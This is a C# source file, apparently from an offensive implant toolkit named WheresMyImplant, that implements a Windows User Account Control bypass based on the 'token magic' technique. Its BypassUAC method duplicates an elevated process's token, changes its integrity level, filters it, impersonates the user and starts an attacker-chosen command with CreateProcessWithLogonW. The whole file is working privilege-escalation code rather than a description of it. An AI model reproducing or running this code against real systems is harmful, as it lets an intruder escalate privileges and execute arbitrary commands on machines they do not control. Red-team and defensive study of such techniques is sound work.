using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using System.Text;

using Unmanaged;

namespace WheresMyImplant
{
    class RestrictedToken : Tokens
    {

        ////////////////////////////////////////////////////////////////////////////////
        //https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1
        ////////////////////////////////////////////////////////////////////////////////
        internal void BypassUAC(Int32 processId, String command)
        {
            WriteOutputGood("Running as: "+ WindowsIdentity.GetCurrent().Name);
            GetPrimaryToken((UInt32)processId);
            SetTokenInformation();
            ImpersonateUser();
            CreateProcessWithLogonW(phNewToken, command, "");
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal void GetPrimaryToken(UInt32 processId)
        {
            //Originally Set to true
            IntPtr hProcess = kernel32.OpenProcess(Constants.PROCESS_QUERY_LIMITED_INFORMATION, true, processId);
            if (hProcess == IntPtr.Zero)
            {
                return;
            }
            WriteOutputGood("Recieved Handle for: "+ processId);
            WriteOutputGood("Process Handle: "+ hProcess.ToInt32());

            if (kernel32.OpenProcessToken(hProcess, (UInt32)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED, out hExistingToken))
            {
                WriteOutputGood("Primary Token Handle: "+ hExistingToken.ToInt32());
            }
            kernel32.CloseHandle(hProcess);

            if (!advapi32.DuplicateTokenEx(
                        hExistingToken,
                        (UInt32)(Constants.TOKEN_ALL_ACCESS),
                        IntPtr.Zero,
                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Winnt.TOKEN_TYPE.TokenPrimary,
                        out phNewToken
            ))
            {
                GetError("DuplicateTokenEx: ");
            }
            else
            {
                WriteOutputGood("Existing Token Handle: "+ hExistingToken.ToInt32());
                WriteOutputGood("New Token Handle: "+ phNewToken.ToInt32());
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal void SetTokenInformation()
        {
            Winnt._SID_IDENTIFIER_AUTHORITY pIdentifierAuthority = new Winnt._SID_IDENTIFIER_AUTHORITY();
            pIdentifierAuthority.Value = new byte[] { 0x0, 0x0, 0x0, 0x0, 0x0, 0x10 };
            byte nSubAuthorityCount = 1;
            IntPtr pSID = new IntPtr();
            if (advapi32.AllocateAndInitializeSid(ref pIdentifierAuthority, nSubAuthorityCount, 0x2000, 0, 0, 0, 0, 0, 0, 0, out pSID))
            {
                WriteOutputGood("Initialized SID : "+ pSID.ToInt32());
            }

            Winnt.SID_AND_ATTRIBUTES sidAndAttributes = new Winnt.SID_AND_ATTRIBUTES();
            sidAndAttributes.Sid = pSID;
            sidAndAttributes.Attributes = Constants.SE_GROUP_INTEGRITY_32;

            Winnt.TOKEN_MANDATORY_LABEL tokenMandatoryLabel = new Winnt.TOKEN_MANDATORY_LABEL();
            tokenMandatoryLabel.Label = sidAndAttributes;
            Int32 tokenMandatoryLableSize = Marshal.SizeOf(tokenMandatoryLabel);

            if (ntdll.NtSetInformationToken(phNewToken, 25, ref tokenMandatoryLabel, tokenMandatoryLableSize) == 0)
            {
                WriteOutputGood("Set Token Information : "+ phNewToken.ToInt32());
            }
            else
            {
                GetError("NtSetInformationToken: ");
            }

            IntPtr luaToken = new IntPtr();
            if (ntdll.NtFilterToken(phNewToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken) == 0)
            {
                Console.WriteLine("Set LUA Token Information : "+ luaToken.ToInt32());
            }
            else
            {
                GetError("NtFilterToken: ");
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean ImpersonateUser()
        {
            IntPtr luaToken = new IntPtr();
            UInt32 flags = 4;
            ntdll.NtFilterToken(phNewToken, flags, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken);

            if (!advapi32.DuplicateTokenEx(
                        phNewToken,
                        (UInt32)(Constants.TOKEN_IMPERSONATE | Constants.TOKEN_QUERY),
                        IntPtr.Zero,
                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Winnt.TOKEN_TYPE.TokenPrimary,
                        out luaToken
            ))
            {
                GetError("DuplicateTokenEx: ");
                return false;
            }
            Console.WriteLine("Duplicate Token Handle: "+ phNewToken.ToInt32());
            if (!advapi32.ImpersonateLoggedOnUser(phNewToken))
            {
                GetError("ImpersonateLoggedOnUser: ");
                return false;
            }
            return true;
        }
    }
}
